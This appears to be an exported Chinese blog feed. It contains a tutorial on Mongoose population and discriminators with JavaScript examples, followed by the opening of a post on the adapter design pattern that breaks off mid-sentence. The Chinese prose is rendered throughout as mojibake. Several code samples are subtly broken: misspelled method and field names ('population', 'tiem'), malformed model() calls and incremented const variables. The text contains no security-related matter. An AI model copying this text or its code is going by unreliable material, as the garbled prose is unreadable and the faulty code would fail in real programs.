è¿”å›žçš„ä¸€åˆ‡å¯¹è±¡ã€‚ 1234567891011121314151617181920212223const mongoose = require('mongoose');const Schema = mongoose.Schema;const personSchema = Schema(&#123; _id:Schema.Types.ObjectId, name:String, age:Number, stories:[&#123;type:Schema.Types.ObjectId,ref:'Story'&#125;]&#125;);const storySchema = Schema(&#123; author:&#123; type:Schema.Types.ObjectId, ref:'Person' &#125;, title:String, fans:[&#123; type:Schema.Types.ObjectId, ref:'Person' &#125;]&#125;);const Story = mongoose.model('Story',storySchema);const Person = mongoose.model('Person',personSchema); ä¸Šé¢åˆ›å»ºäº†ä¸¤ä¸ª Modelï¼ŒPerson model çš„ stories å­—æ®µè®¾ä¸º ObjectId æ•°ç»„ã€‚ref é€‰é¡¹å‘Šè¯‰ Mongoose åœ¨å¡«å……çš„æ—¶å€™ä½¿ç”¨å“ªä¸ª modelï¼Œä¸Šä¾‹ä¸­ä¸º Story çš„ model.æ‰€æœ‰å­˜å‚¨åœ¨æ­¤çš„ _id å¿…é¡»æ˜¯ Story model ä¸­çš„ document çš„ _idã€‚ æ³¨æ„ï¼šObjectIdã€Numberã€String ä»¥åŠ Buffer éƒ½å¯ä»¥ä½œä¸º refs ä½¿ç”¨ã€‚ä½†æ˜¯æœ€å¥½è¿˜æ˜¯ç”¨ ObjectId ä¿å­˜ refsä¿å­˜ refs ä¸Žä¿å­˜æ™®é€šå±žæ€§ä¸€æ ·ï¼ŒæŠŠ _id çš„å€¼èµ‹ç»™å®ƒå°±å¥½äº†ï¼š 12345678910111213141516171819const author = new Person(&#123; _id: new mongoose.Types.ObjectId(), name: 'Ian Fleming', age: 50&#125;);author.save(function (err) &#123; if (err) return handleError(err); var story1 = new Story(&#123; title: 'Casino Royale', author: author._id // assign the _id from the person &#125;); story1.save(function (err) &#123; if (err) return handleError(err); // thats it! &#125;);&#125;); Populationæˆ‘ä»¬åšçš„ä¸œè¥¿è¿˜æ˜¯è·Ÿå¹³æ—¶å·®ä¸å¤šï¼Œåªæ˜¯åˆ›å»ºäº† Person å’Œ Storyã€‚çŽ°åœ¨è¯•è¯•å¯¹query å¡«å…… story çš„ authorã€‚ 123456Story.findOne(&#123; title:'haha'&#125;).population('author').exec(function(err,story)&#123; if(err) return handleError(err); console.log('The author is %s', story.author.name);&#125;); è¢«å¡«å……çš„å­—æ®µå·²ç»ä¸å†æ˜¯åŽŸæ¥çš„ _idï¼Œè€Œæ˜¯è¢«æŒ‡å®šçš„ document æ›¿ä»£ï¼Œè¿™ä¸ª document ç”±å¦ä¸€æ¡ query ä»Žæ•°æ®åº“è¿”å›žã€‚refs æ•°ç»„çš„åŽŸç†ä¹Ÿæ˜¯ç›¸ä¼¼çš„ã€‚å¯¹ query å¯¹è±¡è°ƒç”¨ populate æ–¹æ³•ï¼Œå°±èƒ½è¿”å›žè£…è½½å¯¹åº” _id çš„ document æ•°ç»„ã€‚ è®¾ç½®è¢«å¡«å……å­—æ®µ1234567Story.findOne(&#123; title: 'Casino Royale' &#125;, function(error, story) &#123; if (error) &#123; return handleError(error); &#125; story.author = author; console.log(story.author.name); // prints "Ian Fleming"&#125;); å­—æ®µé€‰æ‹©å¦‚æžœæˆ‘ä»¬åªéœ€è¦å¡«å…… document å…¶ä¸­ä¸€éƒ¨åˆ†å­—æ®µï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ field name syntax å°±å¯ä»¥å®žçŽ°ã€‚ 12345678Story.findOne(&#123;title:/casino royale/i&#125;).populate('author','name').// only return the Persons nameexec(function(err,story)&#123; if(err) return handleError(err); console.log('The author is %s', story.author.name); // The author is Ian Fleming console.log('The author is %s', story.author.age); // The authors age is null&#125;); å¡«å……å¤šä¸ªå­—æ®µ12345Story. find(...). populate('fans'). populate('author'). exec(); å¦‚æžœå¯¹åŒä¸€è·¯å¾„ populate ä¸¤æ¬¡ï¼Œåªæœ‰æœ€åŽä¸€æ¬¡ç”Ÿæ•ˆã€‚ 1234567// ç¬¬äºŒä¸ªä¼šè¦†ç›–ç¬¬ä¸€ä¸ªçš„Story. find(). populate(&#123; path: 'fans', select: 'name' &#125;). populate(&#123; path: 'fans', select: 'email' &#125;);// The above is equivalent to:Story.find().populate(&#123; path: 'fans', select: 'email' &#125;); Query æ¡ä»¶ä¸Žå…¶ä»–é€‰é¡¹å¦‚æžœè¦æ ¹æ®å¹´é¾„æ¥å¡«å……ï¼Œåªå¡«å…… name,å¹¶ä¸”å€¼è¿”å›žæœ€å¤š5ä¸ªæ•°æ® 12345678910Story. find(...). populate(&#123; path: 'fans', match: &#123; age: &#123; $gte: 21 &#125;&#125;, // Explicitly exclude `_id`, see http://bit.ly/2aEfTdB select: 'name -_id', options: &#123; limit: 5 &#125; &#125;). exec(); Refs åˆ° childrenæˆ‘ä»¬å‘çŽ°ï¼Œç”¨ author å¯¹è±¡æ²¡æœ‰åŠžæ³•èŽ·å– story åˆ—è¡¨ï¼Œå› ä¸º author.stories æ²¡æœ‰è¢« pushed ä»»ä½• story å¯¹è±¡ æˆ‘ä»¬å¸Œæœ› author çŸ¥é“å“ªäº› story å±žäºŽä»–ä»¬ï¼Œé€šå¸¸ï¼Œschema åº”è¯¥é€šè¿‡åœ¨ å¤š çš„ä¸€æ–¹ä½¿ç”¨æŒ‡å‘å®ƒä»¬çš„çˆ¶èŠ‚ç‚¹ï¼ˆparent pointerï¼‰è§£å†³ä¸€å¯¹å¤šå…³ç³»é—®é¢˜ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æžœæœ‰å……åˆ†ç†ç”±å¾—åˆ°æŒ‡å‘å­èŠ‚ç‚¹çš„æ•°ç»„ï¼Œå¯ä»¥åƒä¸‹é¢ä»£ç ä¸€æ ·æŠŠ document push() åˆ°æ•°ç»„ä¸­ã€‚ 12author.stories.push(story1);author.save(callback); ç„¶åŽæˆ‘ä»¬å°±èƒ½ find å’Œ populate äº† 123456Person.findOne(&#123;name:'Ian Fleming'&#125;).populate('stories').exec(function(err,person)&#123; if(err) throw handleError(err); console.log(person);&#125;); å¦‚æžœçˆ¶å­èŠ‚ç‚¹äº’ç›¸æŒ‡å‘ï¼Œæ•°æ®å¯èƒ½ä¼šåœ¨æŸä¸€æ—¶åˆ»å¤±åŽ»åŒæ­¥ã€‚ä¸ºæ­¤æˆ‘ä»¬å¯ä»¥ä¸ä½¿ç”¨å¡«å……ï¼Œç›´æŽ¥ find()æˆ‘ä»¬éœ€è¦çš„ story 12345Story.find(&#123;author:author._id&#125;).exec(function(err, stories)&#123; if (err) return handleError(err); console.log('The stories are an array: ', stories);&#125;); query å¡«å……åŽè¿”å›žçš„ document åŠŸèƒ½é½å…¨ï¼Œé™¤éžè®¾ç½® lean é€‰é¡¹ï¼Œå¦åˆ™å®ƒå°±æ˜¯å¯ removeï¼Œå¯ save çš„ã€‚è°ƒç”¨ remove ä¸å•æ˜¯ä»Žæ•°ç»„ä¸­åˆ é™¤ä¹Ÿæ˜¯ä»Žæ•°æ®åº“ä¸­åˆ é™¤å®ƒä»¬ã€‚ å¡«å……çŽ°æœ‰ documentdocument#populate() å¡«å……å¤šä¸ªçŽ°æœ‰ documentå¦‚æžœéœ€è¦å¡«å……ä¸€ä¸ªæˆ–è€…å¤šä¸ª document å¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ Model.populate æ–¹æ³•ã€‚ å¤šçº§å¡«å……å‡è®¾ user schema è®°å½•äº† user çš„ friends 1234567const userSchema = new Schema(&#123; name:String, friends:[&#123; type:ObjectId, ref:'User' &#125;]&#125;); å½“ç„¶å¯ä»¥å¡«å……å¾—åˆ°ç”¨æˆ·çš„ friends åˆ—è¡¨ï¼Œä½†æ˜¯å¦‚æžœè¦åœ¨èŽ·å¾—ä»–ä»¬æœ‹å‹çš„æœ‹å‹å‘¢ï¼ŸæŒ‡å®š populateé€‰é¡¹å°±å¯ä»¥äº† 1234567User.findOne(&#123;name:'Val'&#125;).populate(&#123; path:'friends', populate:&#123; path:'friends' &#125;&#125;) è·¨æ•°æ®åº“å¡«å……å‡è®¾çŽ°åœ¨æœ‰ event schema å’Œ conversation schema,æ¯ä¸ª event å¯¹åº”ä¸€ä¸ª conversation çº¿ç¨‹ 1234567const eventSchema = new Schema(&#123; name:String, conversation:ObjectId&#125;);const conversationSchema = new Schema(&#123; numMessage:Number&#125;); å¹¶ä¸”ï¼Œevent å’Œ conversation ä¿å­˜åœ¨ä¸åŒçš„ MongoDB å®žä¾‹ä¸­ 12345const db1 = mongoose.createConnection('localhost:27000/db1');const db2 = mongoose.createConnection('localhost:27001/db2');const Event = db1.model('Event', eventSchema);const Conversation = db2.model('Conversation', conversationSchema); è¿™ä¸ªæƒ…å†µå°±ä¸èƒ½ç›´æŽ¥ä½¿ç”¨ populate() äº†ï¼Œå› ä¸º populate() ä¸çŸ¥é“åº”è¯¥ä½¿ç”¨ä»€ä¹ˆå¡«å……ã€‚ å¯ä»¥æ˜¾å¼æŒ‡å®šä¸€ä¸ª model 12Event.find().population(&#123;path:'conversation',model:Conversation&#125;).exec(function(err,docs)&#123;&#125;); åŠ¨æ€å¼•ç”¨Mongoose ä¹Ÿå¯ä»¥ä»Žå¤šä¸ª collection å¡«å……ã€‚å‡è®¾ user schema æœ‰ä¸€ç³»åˆ— connectionï¼Œä¸€ä¸ª user å¯ä»¥è¿žæŽ¥åˆ°å…¶ä»– user æˆ–è€…ç»„ç»‡ã€‚ 1234567891011121314const userSchema = new Schema(&#123; name:String, connection:[&#123; kind:String, item:&#123; type:ObjectId, refPath:'connections.kind' &#125; &#125;]&#125;)const organizationSchema = new Schema(&#123;name:String,kind:String&#125;);const User = mongoose.model('User,userSchema');const Organization = mongoose.model('Organization',organizationSchema); ä¸Šé¢çš„ refPath å±žæ€§æ„å‘³ç€ mongoose ä¼šæŸ¥æ‰¾ connections.kind è·¯å¾„ï¼Œ ä»¥æ­¤ç¡®å®š populate() ä½¿ç”¨çš„ modelã€‚æ¢å¥è¯è¯´ï¼ŒrefPath å±žæ€§å¯ä»¥è®©ä½ åŠ¨æ€å¯»æ‰¾ refã€‚ é‰´åˆ«å™¨ï¼ˆDiscriminatorsï¼‰Discriminator æ˜¯ä¸€ç§ schema ç»§æ‰¿æœºåˆ¶ã€‚å®ƒå…è®¸åœ¨ç›¸åŒçš„åº•å±‚ MongoDB collection ä¸Šä½¿ç”¨éƒ¨åˆ†é‡å çš„ schema å»ºç«‹å¤šä¸ª modelã€‚ å‡è®¾è¦åœ¨å•ä¸ª collection ä¸­è®°å½•å¤šç§ event ï¼Œæ¯ä¸ª event éƒ½æœ‰æ—¶é—´æˆ³å­—æ®µï¼Œä½†æ˜¯ click äº‹ä»¶è¿˜æœ‰ URL å­—æ®µï¼Œå¯ä»¥ç”¨ model.discriminator å®žçŽ°ä¸Šé¢çš„è¦æ±‚ã€‚è¿™ä¸ªå‡½æ•°éœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œmodel åç§°å’Œ discriminator schema,è¿”å›ž model ç»“åˆåŽŸ model çš„ schema å’Œ discriminator schema. 12345678910111213141516const options = &#123; discriminatorKey:'kind' &#125;const eventSchema = new mongoose.Schema(&#123;tiem:Date&#125;,options);const Event = mongoose.model('Event'.eventSchema);// ClickedLinkEvent æ˜¯ä¸€ä¸ªæœ‰ URL çš„ç‰¹åˆ« eventconst ClickedLinkEvent = Event.discriminator('ClickedLink', new mongoose.Schema(&#123;url: String&#125;, options));// å½“ä½ åˆ›å»ºé€šç”¨ eventï¼Œä»–å°†æ²¡æœ‰ URL å­—æ®µ...const genericEvent = new Event(&#123;time: Date.now(), url: 'google.com'&#125;);assert.ok(!genericEvent.url);// ä½†æ˜¯ ClickedLinkEvent å¯ä»¥æœ‰const clickedEvent = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);assert.ok(clickedEvent.url); Discriminator å‚¨å­˜åœ¨ Event model çš„ collectionçŽ°åœ¨å‡è®¾ä½ è¦åˆ›å»ºå¦ä¸€ä¸ª discriminatorï¼Œè®°å½•ç”¨æˆ·æ³¨å†Œ eventã€‚ SignedUpEvent å®žä¾‹å°†è·Ÿ é€šç”¨ events å’Œ ClickedLinkEvent å®žä¾‹ ä¸€æ ·å‚¨å­˜åœ¨åŒä¸€ä¸ª collectionã€‚ 12345678910111213141516const event1 = new Event(&#123;time: Date.now()&#125;);const event2 = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);const event3 = new SignedUpEvent(&#123;time: Date.now(), user: 'testuser'&#125;);const save = function (doc, callback) &#123; doc.save(function (error, doc) &#123; callback(error, doc); &#125;);&#125;;async.map([event1, event2, event3], save, function (error) &#123; Event.count(&#123;&#125;, function (error, count) &#123; assert.equal(count, 3); &#125;);&#125;); Discriminator keysMongoose é€šè¿‡ â€˜discriminator keyâ€™ è¯†åˆ«ä¸¤ä¸ªä¸åŒçš„ discriminatorï¼Œ è¿™ä¸ªå€¼é»˜è®¤æ˜¯ __t ã€‚Mongoose è‡ªåŠ¨åœ¨ä½ çš„ schema æ·»åŠ  __t å­—æ®µï¼Œ è®°å½•ä½ çš„ document æ˜¯å“ªä¸ª discriminator çš„å®žä¾‹ã€‚ 1234567const event1 = new Event(&#123;time: Date.now()&#125;);const event2 = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);const event3 = new SignedUpEvent(&#123;time: Date.now(), user: 'testuser'&#125;);assert.ok(!event1.__t);assert.equal(event2.__t, 'ClickedLink');assert.equal(event3.__t, 'SignedUp'); Discriminator åœ¨æŸ¥è¯¢ä¸­æ·»åŠ  discriminator keyDiscriminator model çš„ç‰¹åˆ«ä¹‹å¤„åœ¨äºŽï¼šä»–ä»¬ä¼šæŠŠ discriminator key é™„åˆ° query ä¸Šã€‚æ¢å¥è¯è¯´ï¼Œfind(), count(), aggregate() ç­‰æ–¹æ³• éƒ½èƒ½é€‚é… discriminatorsã€‚ 123456789101112131415161718const event1 = new Event(&#123;time: Date.now()&#125;);const event2 = new ClickedLinkEvent(&#123;time: Date.now(), url: 'google.com'&#125;);const event3 = new SignedUpEvent(&#123;time: Date.now(), user: 'testuser'&#125;);const save = function (doc, callback) &#123; doc.save(function (error, doc) &#123; callback(error, doc); &#125;);&#125;;async.map([event1, event2, event3], save, function (error) &#123; ClickedLinkEvent.find(&#123;&#125;, function (error, docs) &#123; assert.equal(docs.length, 1); assert.equal(docs[0]._id.toString(), event2._id.toString()); assert.equal(docs[0].url, 'google.com'); &#125;);&#125;); Discriminator å¤åˆ¶ pre / post é’©å­Discriminator ä¼šç»§æ‰¿ä»–çš„åŸºç¡€ schema çš„ pre å’Œ post ä¸­é—´ä»¶ã€‚ ä¸è¿‡ï¼Œä½ ä¹Ÿå¯ä»¥ä¸º discriminator æ·»åŠ ä¸­é—´ä»¶ï¼Œè¿™ä¸å›žå½±å“åˆ°åŸºç¡€ schemaã€‚ 123456789101112131415161718192021222324252627282930const options = &#123;discriminatorKey: 'kind'&#125;;const eventSchema = new mongoose.Schema(&#123;time: Date&#125;, options);const eventSchemaCalls = 0;eventSchema.pre('validate', function (next) &#123; ++eventSchemaCalls; next();&#125;);const Event = mongoose.model('GenericEvent', eventSchema);const clickedLinkSchema = new mongoose.Schema(&#123;url: String&#125;, options);const clickedSchemaCalls = 0;clickedLinkSchema.pre('validate', function (next) &#123; ++clickedSchemaCalls; next();&#125;);const ClickedLinkEvent = Event.discriminator('ClickedLinkEvent', clickedLinkSchema);const event1 = new ClickedLinkEvent();event1.validate(function() &#123; assert.equal(eventSchemaCalls, 1); assert.equal(clickedSchemaCalls, 1); const generic = new Event(); generic.validate(function() &#123; assert.equal(eventSchemaCalls, 2); assert.equal(clickedSchemaCalls, 1); &#125;);&#125;); å¤„ç†è‡ªå®šä¹‰ _id å­—æ®µDiscriminator çš„å­—æ®µæ˜¯åŸºç¡€ schema åŠ  discriminator schema ï¼Œ å¹¶ä¸”ä»¥ discriminator schema çš„å­—æ®µä¼˜å…ˆã€‚ ä½†æœ‰ä¸€ä¸ªä¾‹å¤–ï¼Œ_id å­—æ®µã€‚ You can work around this by setting the _id option to false in the discriminator schema as shown below. 1234567891011121314151617181920212223const options = &#123;discriminatorKey: 'kind'&#125;;// åŸºç¡€ schema æœ‰å­—ç¬¦ä¸²æ ¼å¼çš„ `_id` å­—æ®µå’Œ Data æ ¼å¼çš„ `time` å­—æ®µ...const eventSchema = new mongoose.Schema(&#123;_id: String, time: Date&#125;, options);const Event = mongoose.model('BaseEvent', eventSchema);const clickedLinkSchema = new mongoose.Schema(&#123; url: String, time: String&#125;, options);// ä½†æ˜¯ Discriminator schema æœ‰å­—ç¬¦ä¸²æ ¼å¼çš„ `time`ï¼Œå¹¶ä¸”æœ‰// éšå¼æ·»åŠ çš„ ObjectId æ ¼å¼çš„ `_id`assert.ok(clickedLinkSchema.path('_id'));assert.equal(clickedLinkSchema.path('_id').instance, 'ObjectID');const ClickedLinkEvent = Event.discriminator('ChildEventBad', clickedLinkSchema);const event1 = new ClickedLinkEvent(&#123; _id: 'custom id', time: '4pm' &#125;);// é—®é¢˜æ¥äº†ï¼ŒclickedLinkSchema é‡å†™äº† `time` è·¯å¾„ï¼Œä½†æ˜¯**æ²¡æœ‰**// é‡å†™ `_id` è·¯å¾„ï¼Œå› ä¸ºå·²ç»éšå¼æ·»åŠ ï¼ˆæ²¡çœ‹æ‡‚ï¼‰assert.ok(typeof event1._id === 'string');assert.ok(typeof event1.time === 'string'); discriminator ä¸Ž Model.create()å½“ä½ ä½¿ç”¨ Model.create()ï¼ŒMongoose ä¼šè‡ªåŠ¨å¸®ä½ é€‚é… discriminator key ~ 1234567891011121314151617181920212223242526const Schema = mongoose.Schema;const shapeSchema = new Schema(&#123; name: String&#125;, &#123; discriminatorKey: 'kind' &#125;);const Shape = db.model('Shape', shapeSchema);const Circle = Shape.discriminator('Circle', new Schema(&#123; radius: Number &#125;));const Square = Shape.discriminator('Square', new Schema(&#123; side: Number &#125;));const shapes = [ &#123; name: 'Test' &#125;, &#123; kind: 'Circle', radius: 5 &#125;, &#123; kind: 'Square', side: 10 &#125;];Shape.create(shapes, function(error, shapes) &#123; assert.ifError(error); // é‡ç‚¹çœ‹è¿™é‡Œ assert.ok(shapes[0] instanceof Shape); assert.ok(shapes[1] instanceof Circle); assert.equal(shapes[1].radius, 5); assert.ok(shapes[2] instanceof Square); assert.equal(shapes[2].side, 10);&#125;); æ•°ç»„ä¸­çš„åµŒå¥— discriminatorä½ ä¹Ÿå¯ä»¥ä¸ºåµŒå¥—æ–‡æ¡£æ•°ç»„å®šä¹‰ discriminatorã€‚ åµŒå¥— discriminator çš„ç‰¹ç‚¹æ˜¯ï¼šä¸åŒ discriminator ç±»åž‹å‚¨å­˜åœ¨ç›¸åŒçš„æ–‡æ¡£è€Œä¸æ˜¯åŒä¸€ä¸ª mongoDB collectionã€‚ æ¢å¥è¯è¯´ï¼ŒåµŒå¥— discriminator è®©ä½  åœ¨åŒä¸€ä¸ªæ•°ç»„å‚¨å­˜ç¬¦åˆä¸åŒ schema çš„å­æ–‡æ¡£ã€‚ æœ€ä½³å®žè·µï¼šç¡®ä¿ä½ å£°æ˜Žäº†é’©å­å†ä½¿ç”¨ä»–ä»¬ã€‚ ä½ ä¸åº”å½“åœ¨è°ƒç”¨ discriminator() ä¹‹åŽè°ƒç”¨ pre() æˆ– post() 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162const eventSchema = new Schema(&#123; message: String &#125;, &#123; discriminatorKey: 'kind', _id: false &#125;);const batchSchema = new Schema(&#123; events: [eventSchema] &#125;);// `batchSchema.path('events')` gets the mongoose `DocumentArray`const docArray = batchSchema.path('events');// è¿™ä¸ª `events` æ•°ç»„å¯ä»¥åŒ…å« 2 ç§ä¸åŒçš„ event ç±»åž‹ï¼Œ// 'clicked' event that requires an element id that was clicked...const clickedSchema = new Schema(&#123; element: &#123; type: String, required: true &#125;&#125;, &#123; _id: false &#125;);// ç¡®å®šåœ¨è°ƒç”¨ `discriminator()` **ä¹‹å‰**// å¯¹ `eventSchema` å’Œ `clickedSchema` èµ‹äºˆé’©å­const Clicked = docArray.discriminator('Clicked', clickedSchema);// ... and a 'purchased' event that requires the product that was purchased.const Purchased = docArray.discriminator('Purchased', new Schema(&#123; product: &#123; type: String, required: true &#125;&#125;, &#123; _id: false &#125;));const Batch = db.model('EventBatch', batchSchema);// Create a new batch of events with different kindsconst batch = &#123; events: [ &#123; kind: 'Clicked', element: '#hero', message: 'hello' &#125;, &#123; kind: 'Purchased', product: 'action-figure-1', message: 'world' &#125; ]&#125;;Batch.create(batch). then(function(doc) &#123; assert.equal(doc.events.length, 2); assert.equal(doc.events[0].element, '#hero'); assert.equal(doc.events[0].message, 'hello'); assert.ok(doc.events[0] instanceof Clicked); assert.equal(doc.events[1].product, 'action-figure-1'); assert.equal(doc.events[1].message, 'world'); assert.ok(doc.events[1] instanceof Purchased); doc.events.push(&#123; kind: 'Purchased', product: 'action-figure-2' &#125;); return doc.save(); &#125;). then(function(doc) &#123; assert.equal(doc.events.length, 3); assert.equal(doc.events[2].product, 'action-figure-2'); assert.ok(doc.events[2] instanceof Purchased); done(); &#125;). catch(done); æ£€ç´¢æ•°ç»„ä¸­çš„åµŒå¥— discriminatoræ£€ç´¢åµŒå¥— discriminator 12345678910111213141516171819202122232425262728293031323334353637383940414243444546const singleEventSchema = new Schema(&#123; message: String &#125;, &#123; discriminatorKey: 'kind', _id: false &#125;);const eventListSchema = new Schema(&#123; events: [singleEventSchema] &#125;);const subEventSchema = new Schema(&#123; sub_events: [singleEventSchema]&#125;, &#123; _id: false &#125;);const SubEvent = subEventSchema.path('sub_events').discriminator('SubEvent', subEventSchema)eventListSchema.path('events').discriminator('SubEvent', subEventSchema);const Eventlist = db.model('EventList', eventListSchema);// Create a new batch of events with different kindsconst list = &#123; events: [ &#123; kind: 'SubEvent', sub_events: [&#123;kind:'SubEvent', sub_events:[], message:'test1'&#125;], message: 'hello' &#125;, &#123; kind: 'SubEvent', sub_events: [&#123;kind:'SubEvent', sub_events:[&#123;kind:'SubEvent', sub_events:[], message:'test3'&#125;], message:'test2'&#125;], message: 'world' &#125; ]&#125;;Eventlist.create(list). then(function(doc) &#123; assert.equal(doc.events.length, 2); assert.equal(doc.events[0].sub_events[0].message, 'test1'); assert.equal(doc.events[0].message, 'hello'); assert.ok(doc.events[0].sub_events[0] instanceof SubEvent); assert.equal(doc.events[1].sub_events[0].sub_events[0].message, 'test3'); assert.equal(doc.events[1].message, 'world'); assert.ok(doc.events[1].sub_events[0].sub_events[0] instanceof SubEvent); doc.events.push(&#123;kind:'SubEvent', sub_events:[&#123;kind:'SubEvent', sub_events:[], message:'test4'&#125;], message:'pushed'&#125;); return doc.save(); &#125;). then(function(doc) &#123; assert.equal(doc.events.length, 3); assert.equal(doc.events[2].message, 'pushed'); assert.ok(doc.events[2].sub_events[0] instanceof SubEvent); done(); &#125;). catch(done); ###]]></content>
      <categories>
        <category>æ•°æ®åº“ç›¸å…³</category>
      </categories>
      <tags>
        <tag>æ•°æ®åº“ç›¸å…³</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScriptè®¾è®¡æ¨¡å¼â€”â€”é€‚é…å™¨æ¨¡å¼]]></title>
    <url>%2F2019-03-22-JavaScript%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E2%80%94%E2%80%94%E9%80%82%E9%85%8D%E5%99%A8%E6%A8%A1%E5%BC%8F.html</url>
    <content type="text"><![CDATA[å­¦ä¹ æ›¾æŽ¢çš„ ã€ŠJavaScriptè®¾è®¡æ¨¡å¼ä¸Žå¼€å‘å®žè·µã€‹å¹¶åšè®°å½•ã€‚ ä¹¦ç±çš„è´­ä¹°é“¾æŽ¥ è®¾è®¡æ¨¡å¼çš„å®šä¹‰æ˜¯ï¼šåœ¨é¢å‘å¯¹è±¡è½¯ä»¶è®¾è®¡è¿‡ç¨‹ä¸­é’ˆå¯¹ç‰¹å®šé—®é¢˜çš„ç®€æ´è€Œä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‚ é€šä¿—ä¸€ç‚¹ï¼Œè®¾è®¡æ¨¡å¼æ˜¯åœ¨æŸç§åœºåˆä¸‹å¯¹æŸä¸ªé—®é¢˜çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚æ˜¯ç»™é¢å‘å¯¹è±¡è½¯ä»¶å¼€å‘ä¸­çš„ä¸€äº›å¥½çš„è®¾è®¡å–ä¸ªåå­—ã€‚ JavaScriptè®¾è®¡æ¨¡å¼â€”â€”é€‚é…å™¨æ¨¡å¼é€‚é…å™¨æ¨¡å¼çš„ä½œç”¨æ˜¯è§£å†³ä¸¤ä¸ªè½¯ä»¶å®žä½“é—´çš„æŽ¥å£ä¸å…¼å®¹çš„é—®é¢˜ã€‚ä½¿ç”¨é€‚é…å™¨æ¨¡å¼ä¹‹åŽï¼ŒåŽŸæœ¬ç”±äºŽæŽ¥å£ä¸å…¼å®¹è€Œä¸èƒ½å·¥ä½œçš„ä¸¤ä¸ªè½¯ä»¶å®žä½“å¯ä»¥ä¸€èµ·å·¥ä½œã€‚ é€‚é…å™¨çš„åˆ«åæ˜¯åŒ…è£…å™¨ï¼Œè¿™æ˜¯ä¸€ä¸ªç›¸å¯¹ç®€å•çš„æ¨¡å¼ã€‚åœ¨ç¨‹åºå¼€å‘ä¸­æœ‰è®¸å¤šè¿™æ ·çš„åœºæ™¯ï¼Œå½“æˆ‘ä»¬è¯•å›¾è°ƒç”¨æ¨¡å—æˆ–è€…å¯¹è±¡çš„æŸä¸ªæŽ¥å£çš„æ—¶å€™ï¼Œå´å‘çŽ°è¿™ä¸ªæŽ¥å£çš„æ ¼å¼å¹¶ä¸ç¬¦åˆç›®å‰çš„éœ€æ±‚ã€‚è¿™æ—¶å€™æœ‰ä¸¤ä¸ªè§£å†³æ–¹æ³•ï¼Œç¬¬ä¸€ç§æ˜¯ä¿®æ”¹åŽŸæ¥çš„æŽ¥å£ï¼Œä½†æ˜¯å¦‚æžœåŽŸæ¥çš„æ¨¡å—å¾ˆå¤æ‚ï¼ŒåŽè€…æˆ‘ä»¬æ‹¿åˆ°çš„æ¨¡å—æ˜¯åˆ«äººç¼–å†™åŽ‹ç¼©çš„ä»£ç ï¼Œä¿®æ”¹åŽŸæ¥çš„æŽ¥å£å°±ä¸å¤ªçŽ°å®žäº†ã€‚ç¬¬äºŒç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªé€‚é…å™¨ï¼Œå°†åŽŸæ¥çš„æŽ¥å£è£…æ¢ä¸ºå®¢æˆ·å¸Œæœ›çš„å¦ä¸€ä¸ªæŽ¥å£ï¼Œå®¢æˆ·åªéœ€è¦å’Œé€‚é…å™¨æ‰“äº¤é“ã€‚ çŽ°å®žä¸­çš„é€‚é…å™¨é€‚é…å™¨åœ¨çŽ°å®žç”Ÿæ´»çš„åº”ç”¨éžå¸¸å¹¿æ³›ï¼ŒæŽ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹å‡ ä¸ªçŽ°å®žç”Ÿæ´»ä¸­çš„é€‚é…å™¨æ¨¡å¼ã€‚ 1.æ¸¯å¼æ’å¤´è½¬æ¢å™¨æ¸¯å¼çš„ç”µå™¨æ’å¤´æ¯”å¤§é™†çš„ç”µå™¨æ’å¤´ä½“ç§¯è¦å¤§ä¸€äº›ã€‚å¦‚æžœä»Žé¦™æ¸¯ä¹°äº†ä¸€ä¸ª Mac bookï¼Œæˆ‘ä»¬ä¼šå‘çŽ°å……ç”µå™¨æ— æ³•æ’åœ¨å®¶é‡Œçš„æ’åº§ä¸Šï¼Œä¸ºæ­¤è€Œæ”¹é€ å®¶é‡Œçš„æ’åº§æ˜¾ç„¶ä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªé€‚é…å™¨ã€‚ 2.ç”µæºé€‚é…å™¨ Mac book ç”µæ± æ”¯æŒçš„ç”µåŽ‹æ˜¯ 20Vï¼Œæˆ‘ä»¬æ—¥å¸¸ç”Ÿæ´»ä¸­çš„äº¤æµç”µåŽ‹ä¸€èˆ¬æ˜¯ 220Vã€‚é™¤äº†æˆ‘ä»¬äº†è§£çš„ 220V äº¤æµç”µåŽ‹ï¼Œæ—¥æœ¬å’ŒéŸ©å›½çš„äº¤æµç”µåŽ‹å¤§å¤šæ˜¯ 100Vï¼Œè€Œè‹±å›½å’Œæ¾³å¤§åˆ©äºšçš„æ˜¯ 240Vã€‚ç¬”è®°æœ¬ç”µè„‘çš„ç”µæºé€‚é…å™¨å°±æ‰¿æ‹…äº†è½¬æ¢ç”µåŽ‹çš„ä½œç”¨ï¼Œç”µæºé€‚é…å™¨ä½¿ç¬”è®°æœ¬ç”µè„‘åœ¨ 100V~240V çš„ç”µåŽ‹ä¹‹å†…éƒ½èƒ½æ­£å¸¸å·¥ä½œï¼Œè¿™ä¹Ÿæ˜¯å®ƒä¸ºä»€ä¹ˆè¢«ç§°ä¸ºç”µæºâ€œé€‚é…å™¨â€çš„åŽŸå› ã€‚ 3.USB è½¬æŽ¥å£ åœ¨ä»¥å‰çš„ç”µè„‘ä¸Šï¼ŒPS2 æŽ¥å£æ˜¯è¿žæŽ¥é¼ æ ‡ã€é”®ç›˜ç­‰å…¶ä»–å¤–éƒ¨è®¾å¤‡çš„æ ‡å‡†æŽ¥å£ã€‚ä½†éšç€æŠ€æœ¯çš„å‘å±•ï¼Œè¶Šæ¥è¶Šå¤šçš„ç”µè„‘å¼€å§‹æ”¾å¼ƒäº† PS2 æŽ¥å£ï¼Œè½¬è€Œä»…æ”¯æŒ USB 